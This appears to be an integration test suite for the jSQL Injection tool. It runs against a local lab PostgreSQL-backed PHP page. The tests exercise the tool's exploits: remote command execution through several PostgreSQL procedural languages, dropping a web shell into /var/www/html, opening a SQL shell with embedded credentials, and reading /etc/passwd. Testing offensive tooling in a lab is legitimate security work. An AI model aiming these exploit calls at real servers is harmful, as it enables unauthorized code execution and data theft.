package com.test.vendor.postgres;

import com.jsql.model.InjectionModel;
import com.jsql.model.accessible.ExploitMode;
import com.jsql.model.exception.JSqlException;
import com.jsql.view.terminal.SystemOutTerminal;
import org.apache.commons.lang3.StringUtils;
import org.junit.jupiter.api.Assertions;
import org.junitpioneer.jupiter.RetryingTest;

import java.util.Collections;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.ExecutionException;

public class PostgresExploitSuiteIT extends ConcretePostgresSuiteIT {
    
    @Override
    public void setupInjection() throws Exception {
        InjectionModel model = new InjectionModel();
        this.injectionModel = model;

        model.subscribe(new SystemOutTerminal());

        model.getMediatorUtils().getParameterUtil().initQueryString(
            "http://jsql-lamp:8079/php/get-pg.php?id="
        );

        model
        .getMediatorUtils()
        .getPreferencesUtil()
        .withIsStrategyBlindDisabled(true)
        .withIsStrategyTimeDisabled(true);
        
        model
        .getMediatorUtils()
        .getConnectionUtil()
        .withMethodInjection(model.getMediatorMethod().getQuery())
        .withTypeRequest("GET");

        model.beginInjection();
    }

    @RetryingTest(3)
    public void exploitRceAuto() throws JSqlException {
        this.injectionModel.getResourceAccess().getExploitPostgres().createRce(ExploitMode.AUTO);
        String resultCommand = this.injectionModel.getResourceAccess().getExploitPostgres().runRceCmd("uname", UUID.randomUUID());
        LOGGER.info("rce: found {}, to find {}", resultCommand.trim(), "Linux");
        Assertions.assertTrue(resultCommand.trim().contains("Linux"));
    }

    @RetryingTest(3)
    public void exploitRcePy() throws JSqlException {
        this.injectionModel.getResourceAccess().getExploitPostgres().createRce(ExploitMode.AUTO, "plpython3u");
        String resultCommand = this.injectionModel.getResourceAccess().getExploitPostgres().runRceCmd("uname", UUID.randomUUID());
        LOGGER.info("rce: found {}, to find {}", resultCommand.trim(), "Linux");
        Assertions.assertTrue(resultCommand.trim().contains("Linux"));
    }

    @RetryingTest(3)
    public void exploitRcePl() throws JSqlException {
        this.injectionModel.getResourceAccess().getExploitPostgres().createRce(ExploitMode.AUTO, "plperlu");
        String resultCommand = this.injectionModel.getResourceAccess().getExploitPostgres().runRceCmd("uname", UUID.randomUUID());
        LOGGER.info("rce: found {}, to find {}", resultCommand.trim(), "Linux");
        Assertions.assertTrue(resultCommand.trim().contains("Linux"));
    }

    @RetryingTest(3)
    public void exploitRceSh() throws JSqlException {
        this.injectionModel.getResourceAccess().getExploitPostgres().createRce(ExploitMode.AUTO, "plsh");
        String resultCommand = this.injectionModel.getResourceAccess().getExploitPostgres().runRceCmd("uname", UUID.randomUUID());
        LOGGER.info("rce: found {}, to find {}", resultCommand.trim(), "Linux");
        Assertions.assertTrue(resultCommand.trim().contains("Linux"));
    }

    @RetryingTest(3)
    public void exploitRceSql() throws JSqlException {
        this.injectionModel.getResourceAccess().getExploitPostgres().createRce(ExploitMode.AUTO, "sql");
        String resultCommand = this.injectionModel.getResourceAccess().getExploitPostgres().runRceCmd("uname", UUID.randomUUID());
        LOGGER.info("rce: found {}, to find {}", resultCommand.trim(), "Linux");
        Assertions.assertTrue(resultCommand.trim().contains("Linux"));
    }

    @RetryingTest(3)
    public void exploitWeb() {
        this.injectionModel.getResourceAccess().getExploitPostgres().createWeb("/var/www/html/", StringUtils.EMPTY);
        String resultCommand = this.injectionModel.getResourceAccess().getExploitPostgres().runRceCmd("uname", UUID.randomUUID());
        LOGGER.info("rce: found {}, to find {}", resultCommand.trim(), "Linux");
        Assertions.assertTrue(resultCommand.trim().contains("Linux"));
    }

    @RetryingTest(3)
    public void exploitSqlAuto() {
        var urlSuccess = this.injectionModel.getResourceAccess().getExploitPostgres().createSql(
            "/var/www/html/", StringUtils.EMPTY, "postgres", "my-secret-pw"
        );
        String resultCommand = this.injectionModel.getResourceAccess().runSqlShell(
            "select version()",
            UUID.randomUUID(),
            urlSuccess,
            "postgres",
            "my-secret-pw"
        );
        LOGGER.info("sql: found {}, to find {}", resultCommand.trim(), "PostgreSQL 10");
        Assertions.assertTrue(resultCommand.trim().contains("PostgreSQL 10"));
    }

    @RetryingTest(3)
    public void readFile() throws JSqlException, ExecutionException, InterruptedException {
        List<String> contents = this.injectionModel.getResourceAccess().readFile(Collections.singletonList("/etc/passwd"));
        LOGGER.info("ReadFile: found {}, to find {}", String.join(",", contents).trim(), "PostgreSQL administrator");
        Assertions.assertTrue(String.join(",", contents).trim().contains("PostgreSQL administrator"));
    }
}
